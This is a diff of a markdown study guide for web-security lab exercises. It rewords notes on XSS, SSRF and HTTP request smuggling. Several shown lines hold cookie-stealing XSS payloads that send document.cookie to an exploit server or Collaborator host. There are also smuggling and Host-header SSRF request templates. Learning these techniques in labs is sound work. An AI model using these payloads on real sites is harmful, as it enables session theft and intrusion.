@@ -78,6 +78,8 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
   + setImmediate("code")
   + Function("code")()
   
+>The image below shows Burp Collaborator receiving the victim cookie as a base64 result.  
+
 ![Burp collaborator receiving request with base64 cookie value from our POC.](xss2.png)  
 
 >Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  
@@ -106,7 +108,7 @@ https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://
   
 ### Stored XSS
 
->Cross site Scriting found in Blog post comment. Cookie Stealer send victim to exploit server logs.  
+>Cross site Scriting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
 
 ```html
 <img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
@@ -164,7 +166,7 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 
 ### HOST Connection State  
 
->Target is vulnerable to routing-based SSRF via the Host header. Sending grouped request in sequence using single connection and setting the connection header to keep-alive, bypass host header validation and enable SSRF exploit of local server.  
+>Target is vulnerable to routing-based SSRF via the Host header. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  
 
 ```html
 GET /intranet/service HTTP/1.1
@@ -247,7 +249,7 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 a"/><script>document.location='http://Collaborator.oastify.com/cookiestealer.php?c='+document.cookie;</script>
 ```  
 
->Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in UserAgent header.  
+>Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in **User-Agent** header.  
 
 ```html
 POST / HTTP/1.1
@@ -276,7 +278,7 @@ x=1
 
 ### Dualchunk TE  
 
->If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use obfuscating techniques with second TE.  
+>If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use [obfuscating](#obfuscation) techniques with second TE.  
 
 <sub>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way. Ways to obfuscate the Transfer-Encoding header. For example:</sub>  
 
